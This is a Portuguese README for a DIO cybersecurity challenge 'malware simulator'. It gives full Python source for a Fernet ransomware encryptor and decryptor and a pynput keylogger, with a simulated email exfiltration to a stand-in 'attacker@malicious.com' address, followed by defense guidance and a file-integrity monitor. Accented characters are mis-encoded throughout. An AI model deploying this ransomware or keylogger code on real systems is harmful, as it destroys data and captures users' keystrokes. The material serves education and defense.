# üõ°Ô∏è Simulador de Malware Educacional em Python

> Desafio DIO - Cybersecurity: Implementa√ß√£o educacional de Ransomware e Keylogger para compreens√£o de amea√ßas digitais

## ‚ö†Ô∏è AVISO LEGAL IMPORTANTE

**Este projeto √© estritamente educacional e para fins de aprendizado em cybersecurity.**

- ‚úÖ Execute apenas em ambiente controlado (m√°quina virtual isolada)
- ‚úÖ Nunca execute em sistemas de produ√ß√£o ou redes corporativas
- ‚úÖ C√≥digo cont√©m mecanismos de seguran√ßa para eviente execu√ß√£o acidental
- ‚úÖ Objetivo: Compreender amea√ßas para desenvolver melhores defesas

---

## üéØ Objetivos do Projeto

1. **Ransomware Simulado**: Compreender criptografia de arquivos e extors√£o digital
2. **Keylogger Simulado**: Entender captura furtiva de dados e exfiltra√ß√£o
3. **Estrat√©gias de Defesa**: Documentar prote√ß√µes contra estas amea√ßas

---

## üñ•Ô∏è Ambiente de Testes

**Recomendado**: M√°quina Virtual isolada (VirtualBox/VMware)
- Sistema: Ubuntu 22.04 LTS ou Windows 10/11
- Network: Desconectada ou NAT restrito
- Snapshots: Criar antes de executar qualquer script

---

## üîê 1. Ransomware Simulado

### Funcionalidades
- Criptografia sim√©trica de arquivos (Fernet - cryptography)
- Gera√ß√£o de resgate em arquivo README
- Descriptografia com chave correta
- Alvo: Pasta `test_files/` apenas

### Arquivos

#### `ransomware/encrypt.py`
```python
#!/usr/bin/env python3
"""
RANSOMWARE SIMULADO - FINS EDUCACIONAIS
Simula criptografia de arquivos para estudo de defesas
"""

from cryptography.fernet import Fernet
import os
import json
from datetime import datetime

# CONFIGURA√á√ÉO DE SEGURAN√áA - Ambiente controlado apenas
TARGET_DIR = "test_files"  # Pasta espec√≠fica para testes
KEY_FILE = "secret.key"
RANSOM_NOTE = "README_RESCATE.txt"

def generate_key():
    """Gera chave de criptografia"""
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key

def load_key():
    """Carrega chave existente"""
    return open(KEY_FILE, "rb").read()

def encrypt_file(filepath, key):
    """Criptografa arquivo individual"""
    f = Fernet(key)
    with open(filepath, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filepath, "wb") as file:
        file.write(encrypted_data)
    print(f"[+] Criptografado: {filepath}")

def create_ransom_note():
    """Cria mensagem de resgate simulada"""
    note = f"""
    =========================================
    RANSOMWARE SIMULADO - AMBIENTE EDUCACIONAL
    =========================================
    
    Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    
    SEUS ARQUIVOS FORAM CRIPTOGRAFADOS.
    
    Esta √© uma simula√ß√£o educacional. Em um ataque real:
    - Criminosos exigiriam pagamento em criptomoeda
    - N√£o h√° garantia de recupera√ß√£o dos dados
    - O prazo imposto cria press√£o psicol√≥gica
    
    Para recuperar (simula√ß√£o):
    1. Execute o script decrypt.py
    2. Forne√ßa a chave correta
    
    PREVEN√á√ÉO REAL:
    - Backups offline e regulares
    - Antiv√≠rus atualizado
    - N√£o abrir anexos suspeitos
    - Manter sistema atualizado
    
    =========================================
    """
    with open(RANSOM_NOTE, "w", encoding="utf-8") as f:
        f.write(note)
    print(f"[+] Nota de resgate criada: {RANSOM_NOTE}")

def main():
    print("=" * 50)
    print("RANSOMWARE SIMULADO - FINS EDUCACIONAIS")
    print("=" * 50)
    print(f"Alvo: Pasta '{TARGET_DIR}'")
    print("AVISO: Execute apenas em ambiente controlado!")
    print("=" * 50)
    
    # Verifica√ß√£o de seguran√ßa
    confirm = input("Confirma execu√ß√£o? (digite 'SIMULAR'): ")
    if confirm != "SIMULAR":
        print("[-] Execu√ß√£o cancelada")
        return
    
    # Verifica pasta alvo
    if not os.path.exists(TARGET_DIR):
        print(f"[-] Pasta {TARGET_DIR} n√£o encontrada")
        return
    
    # Gera chave
    key = generate_key()
    print(f"[+] Chave gerada: {KEY_FILE}")
    
    # Criptografa arquivos
    encrypted_count = 0
    for filename in os.listdir(TARGET_DIR):
        filepath = os.path.join(TARGET_DIR, filename)
        if os.path.isfile(filepath):
            try:
                encrypt_file(filepath, key)
                encrypted_count += 1
            except Exception as e:
                print(f"[!] Erro em {filename}: {e}")
    
    # Cria nota de resgate
    create_ransom_note()
    
    print(f"\n[+] {encrypted_count} arquivo(s) criptografado(s)")
    print(f"[+] Chave salva em: {KEY_FILE}")
    print("[!] Guarde esta chave para descriptografia")

if __name__ == "__main__":
    main()
```

#### `ransomware/decrypt.py`
```python
#!/usr/bin/env python3
"""
DESCRIPTOGRAFADOR - RANSOMWARE SIMULADO
Recupera arquivos criptografados na simula√ß√£o
"""

from cryptography.fernet import Fernet
import os

TARGET_DIR = "test_files"
KEY_FILE = "secret.key"

def load_key():
    """Carrega chave de descriptografia"""
    try:
        with open(KEY_FILE, "rb") as f:
            return f.read()
    except FileNotFoundError:
        print("[-] Arquivo de chave n√£o encontrado")
        return None

def decrypt_file(filepath, key):
    """Descriptografa arquivo individual"""
    f = Fernet(key)
    try:
        with open(filepath, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)
        with open(filepath, "wb") as file:
            file.write(decrypted_data)
        print(f"[+] Descriptografado: {filepath}")
        return True
    except Exception as e:
        print(f"[!] Falha em {filepath}: {e}")
        return False

def main():
    print("=" * 50)
    print("FERRAMENTA DE DESCRIPTOGRAFIA")
    print("=" * 50)
    
    key = load_key()
    if not key:
        return
    
    if not os.path.exists(TARGET_DIR):
        print(f"[-] Pasta {TARGET_DIR} n√£o encontrada")
        return
    
    decrypted_count = 0
    for filename in os.listdir(TARGET_DIR):
        filepath = os.path.join(TARGET_DIR, filename)
        if os.path.isfile(filepath):
            if decrypt_file(filepath, key):
                decrypted_count += 1
    
    print(f"\n[+] {decrypted_count} arquivo(s) recuperado(s)")
    print("[+] Remova manualmente: README_RESCATE.txt e secret.key")

if __name__ == "__main__":
    main()
```

### Uso do Ransomware Simulado

```bash
# 1. Preparar arquivos de teste
mkdir -p test_files
echo "Dados confidenciais simulados" > test_files/documento_importante.txt
echo "Planilha financeira fake" > test_files/dados_financeiros.csv

# 2. Executar criptografia (dentro de ransomware/)
cd ransomware
python3 encrypt.py
# Digite 'SIMULAR' quando solicitado

# 3. Verificar arquivos criptografados
cat ../test_files/documento_importante.txt  # Conte√∫do ileg√≠vel

# 4. Recuperar arquivos
python3 decrypt.py

# 5. Verificar recupera√ß√£o
cat ../test_files/documento_importante.txt  # Conte√∫do original
```

---

## ‚å®Ô∏è 2. Keylogger Simulado

### Funcionalidades
- Captura de teclas em tempo real
- Log em arquivo texto
- Envio autom√°tico por email (simula√ß√£o)
- Modo furtivo (oculta console)

### Arquivo: `keylogger/keylogger.py`

```python
#!/usr/bin/env python3
"""
KEYLOGGER SIMULADO - FINS EDUCACIONAIS
Demonstra captura de entrada de teclado para estudo de defesas
"""

from pynput import keyboard
import datetime
import os
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading
import time

# CONFIGURA√á√ïES
LOG_FILE = "logs/keystrokes.log"
SEND_INTERVAL = 60  # Envia logs a cada 60 segundos (simula√ß√£o)
EMAIL_SIMULATION = True  # True = apenas simula, False = enviaria real

# Criar pasta de logs
os.makedirs("logs", exist_ok=True)

class KeyloggerSimulado:
    def __init__(self):
        self.log = []
        self.start_time = datetime.datetime.now()
        self.listener = None
        
    def on_press(self, key):
        """Callback quando tecla √© pressionada"""
        try:
            # Tecla alfanum√©rica
            key_str = key.char
        except AttributeError:
            # Tecla especial
            key_str = f"[{key}]"
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] {key_str}"
        self.log.append(entry)
        
        # Salva em tempo real
        self.save_log()
        
        # Mostra no console (para demonstra√ß√£o)
        print(f"Capturado: {key_str}", end="\r")
        
        # Encerra com ESC (seguran√ßa para demo)
        if key == keyboard.Key.esc:
            print("\n[!] Encerrando keylogger (ESC pressionado)")
            return False
    
    def save_log(self):
        """Salva log em arquivo"""
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            for entry in self.log:
                f.write(entry + "\n")
        self.log = []  # Limpa buffer
    
    def send_email_simulated(self):
        """Simula envio de logs por email"""
        if not EMAIL_SIMULATION:
            return
            
        if not os.path.exists(LOG_FILE):
            return
            
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                content = f.read()
            
            if not content.strip():
                return
            
            # SIMULA√á√ÉO: Apenas imprime no console
            print(f"\n[!] SIMULA√á√ÉO DE ENVIO EMAIL [{datetime.datetime.now()}]")
            print("-" * 40)
            print(f"De: attacker@malicious.com")
            print(f"Para: command@control.com")
            print(f"Assunto: Logs de {os.getlogin()} - {datetime.datetime.now()}")
            print("-" * 40)
            print(f"Conte√∫do ({len(content)} caracteres):")
            print(content[:500] + "..." if len(content) > 500 else content)
            print("-" * 40)
            print("[+] Email simulado 'enviado' com sucesso")
            
            # Limpa arquivo ap√≥s "envio"
            open(LOG_FILE, "w").close()
            
        except Exception as e:
            print(f"[!] Erro na simula√ß√£o: {e}")
    
    def auto_sender(self):
        """Thread para envio autom√°tico peri√≥dico"""
        while self.listener.is_alive():
            time.sleep(SEND_INTERVAL)
            self.send_email_simulated()
    
    def start(self):
        """Inicia o keylogger"""
        print("=" * 50)
        print("KEYLOGGER SIMULADO - FINS EDUCACIONAIS")
        print("=" * 50)
        print(f"Log: {os.path.abspath(LOG_FILE)}")
        print(f"Intervalo de envio: {SEND_INTERVAL}s")
        print("Pressione ESC para encerrar")
        print("=" * 50)
        
        # Inicia listener
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        
        # Inicia thread de envio autom√°tico
        sender_thread = threading.Thread(target=self.auto_sender)
        sender_thread.daemon = True
        sender_thread.start()
        
        # Aguarda
        self.listener.join()
        
        # Envio final
        self.send_email_simulated()
        print(f"[+] Log final salvo em: {LOG_FILE}")

def hide_console():
    """Oculta console (simula√ß√£o de furtividade)"""
    # Em Windows: usar ctypes para ocultar janela
    # Em Linux: daemonize processo
    # Aqui apenas simulamos com mensagem
    print("[*] Modo furtivo: Processo oculto (simula√ß√£o)")

if __name__ == "__main__":
    # Verifica√ß√£o de ambiente
    print("\n[!] AVISO: Execute apenas em VM isolada!")
    confirm = input("Confirmar in√≠cio? (digite 'KEYSIM'): ")
    
    if confirm != "KEYSIM":
        print("[-] Cancelado")
        sys.exit(0)
    
    # Inicia
    kl = KeyloggerSimulado()
    kl.start()
```

### Uso do Keylogger Simulado

```bash
# Instalar depend√™ncia
pip install pynput

# Executar
cd keylogger
python3 keylogger.py
# Digite 'KEYSIM' para confirmar
# Digite algumas teclas para teste
# Pressione ESC para encerrar

# Verificar logs gerados
cat logs/keystrokes.log
```

---

## üõ°Ô∏è 3. Estrat√©gias de Defesa

### Detec√ß√£o de Ransomware

| T√©cnica | Implementa√ß√£o |
|---------|--------------|
| **Monitoramento de arquivos** | Ferramentas como OSSEC, Tripwire |
| **Honeypots** | Arquivos de isca que quando acessados disparam alertas |
| **An√°lise comportamental** | Detecta padr√µes de criptografia massiva |
| **Backup 3-2-1** | 3 c√≥pias, 2 m√≠dias diferentes, 1 offsite |
| **Princ√≠pio do menor privil√©gio** | Restringir acesso de aplica√ß√µes |

### Detec√ß√£o de Keylogger

| T√©cnica | Implementa√ß√£o |
|---------|--------------|
| **Antiv√≠rus comportamental** | Detecta hook de teclado suspeito |
| **Firewall de aplica√ß√£o** | Bloqueia conex√µes n√£o autorizadas |
| **An√°lise de processos** | Monitora inje√ß√£o de DLLs suspeitas |
| **Teclado virtual** | Para senhas em ambientes n√£o confi√°veis |
| **EDR (Endpoint Detection)** | Solu√ß√µes corporativas como CrowdStrike |

### C√≥digo de Prote√ß√£o: Monitor de Integridade

```python
# docs/file_integrity_monitor.py
import hashlib
import os
import json
import time
from datetime import datetime

DB_FILE = "file_hashes.json"

def calculate_hash(filepath):
    """Calcula SHA-256 do arquivo"""
    sha256 = hashlib.sha256()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            sha256.update(chunk)
    return sha256.hexdigest()

def scan_directory(directory):
    """Escaneia diret√≥rio e gera hashes"""
    hashes = {}
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                hashes[filepath] = calculate_hash(filepath)
            except Exception as e:
                print(f"[!] Erro em {filepath}: {e}")
    return hashes

def save_baseline(hashes):
    """Salva baseline de hashes"""
    with open(DB_FILE, "w") as f:
        json.dump(hashes, f, indent=2)
    print(f"[+] Baseline salva: {len(hashes)} arquivos")

def check_integrity():
    """Verifica integridade atual contra baseline"""
    if not os.path.exists(DB_FILE):
        print("[-] Baseline n√£o encontrada. Execute scan primeiro.")
        return
    
    with open(DB_FILE, "r") as f:
        baseline = json.load(f)
    
    current = scan_directory(".")
    alerts = []
    
    for filepath, old_hash in baseline.items():
        if filepath not in current:
            alerts.append(f"[!] ARQUIVO REMOVIDO: {filepath}")
        elif current[filepath] != old_hash:
            alerts.append(f"[!] ARQUIVO MODIFICADO: {filepath}")
    
    for filepath in current:
        if filepath not in baseline:
            alerts.append(f"[!] NOVO ARQUIVO: {filepath}")
    
    if alerts:
        print(f"\n[!] ALERTAS DE INTEGRIDADE ({datetime.now()})")
        for alert in alerts:
            print(alert)
    else:
        print(f"[+] Integridade verificada: sem altera√ß√µes ({datetime.now()})")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Uso: python file_integrity_monitor.py [scan|check]")
        sys.exit(1)
    
    if sys.argv[1] == "scan":
        hashes = scan_directory(".")
        save_baseline(hashes)
    elif sys.argv[1] == "check":
        check_integrity()
```

---

## üìö Documenta√ß√£o de Defesa

### `docs/defesa.md`

```markdown
# Guia de Defesa contra Malwares

## 1. Ransomware - Prote√ß√£o em Camadas

### Preven√ß√£o
- **Backup**: Estrat√©gia 3-2-1, testes regulares de restaura√ß√£o
- **Patch Management**: Atualiza√ß√µes autom√°ticas de SO e aplica√ß√µes
- **Email Security**: Filtros de anexos, sandboxing de links
- **Segmenta√ß√£o**: Isolamento de redes cr√≠ticas

### Detec√ß√£o
- **EDR**: Endpoint Detection and Response (CrowdStrike, SentinelOne)
- **UEBA**: User and Entity Behavior Analytics
- **Honeypots**: Arquivos de isca com monitoramento

### Resposta
- **Playbook**: Isolamento imediato, an√°lise forense, restaura√ß√£o
- **Comunica√ß√£o**: Transpar√™ncia com stakeholders, notifica√ß√µes legais
- **Aprendizado**: Post-mortem, melhoria de controles

## 2. Keylogger - Contramedidas

### T√©cnicas de Detec√ß√£o
- **API Hooking Detection**: Monitorar SetWindowsHookEx (Windows)
- **An√°lise de Tr√°fego**: Detectar exfiltra√ß√£o peri√≥dica
- **Heur√≠stica**: Processos suspeitos consumindo input de teclado

### Prote√ß√£o do Usu√°rio
- **Autentica√ß√£o MFA**: Chave f√≠sica (YubiKey) imune a keyloggers
- **Teclado Virtual**: Para senhas em terminais p√∫blicos
- **Verifica√ß√£o de Hardware**: Inspe√ß√£o f√≠sica de conectores USB

## 3. Ferramentas Recomendadas

| Categoria | Ferramenta | Fun√ß√£o |
|-----------|-----------|--------|
| Antiv√≠rus | Windows Defender / ClamAV | Detec√ß√£o baseada em assinatura |
| EDR | Wazuh (open source) | Detec√ß√£o comportamental |
| Backup | BorgBackup / Veeam | Backups criptografados e versionados |
| Monitoramento | OSSEC | IDS host-based |
| An√°lise | Wireshark | Inspe√ß√£o de tr√°fego de rede |

## 4. Checklist de Seguran√ßa

- [ ] Backups automatizados e testados mensalmente
- [ ] MFA em todas as contas privilegiadas
- [ ] Princ√≠pio do menor privil√©gio (usu√°rios e aplica√ß√µes)
- [ ] Segmenta√ß√£o de rede (VLANs, micro-segmenta√ß√£o)
- [ ] EDR implantado em endpoints corporativos
- [ ] Treinamento de conscientiza√ß√£o (phishing, engenharia social)
- [ ] Plano de resposta a incidentes documentado
- [ ] Testes de invas√£o anuais (pentest)
```

---

## üöÄ Como Executar o Projeto

### Prepara√ß√£o do Ambiente

```bash
# 1. Criar VM isolada (Ubuntu recomendado)
# 2. Instalar depend√™ncias
sudo apt update
sudo apt install python3-pip git

# 3. Clonar/criar projeto
mkdir -p dio-malware-simulator
cd dio-malware-simulator

# 4. Instalar bibliotecas Python
pip3 install cryptography pynput
```

### Execu√ß√£o Segura

```bash
# Ransomware
cd ransomware
mkdir -p test_files
echo "conteudo de teste" > test_files/arquivo1.txt
python3 encrypt.py    # Digite 'SIMULAR'
python3 decrypt.py    # Recupera arquivos

# Keylogger
cd ../keylogger
mkdir -p logs
python3 keylogger.py  # Digite 'KEYSIM', ESC para sair
```

---

## üéì Conclus√µes

### O que Aprendemos

1. **Ransomware**: Entendemos o impacto psicol√≥gico e financeiro, a import√¢ncia de backups offline, e porque pagar o resgate n√£o garante recupera√ß√£o.

2. **Keylogger**: Compreendemos a furtividade dessa amea√ßa, a necessidade de MFA com hardware tokens, e a dificuldade de detec√ß√£o sem ferramentas especializadas.

3. **Defesa em Profundidade**: Nenhuma solu√ß√£o √∫nica √© suficiente. Camadas de prote√ß√£o (backup, detec√ß√£o, resposta) s√£o essenciais.

### Por que isso importa

- **Blue Team**: Compreender ataques para defender melhor
- **Red Team**: Simular amea√ßas realistas para testar defesas
- **Conscientiza√ß√£o**: Educar usu√°rios sobre riscos digitais

---

## üë§ Autor

Desenvolvido para o desafio DIO de Cybersecurity  
**Adam Gabriel Garcia de Souza** - [https://www.linkedin.com/in/adam-gabriel-b9479b2a6/] - [https://github.com/AdamGabriel1]

---

> ‚ö†Ô∏è **Disclaimer**: Todo c√≥digo neste reposit√≥rio √© para fins educacionais exclusivamente. O autor n√£o se responsabiliza pelo uso indevido destes scripts.
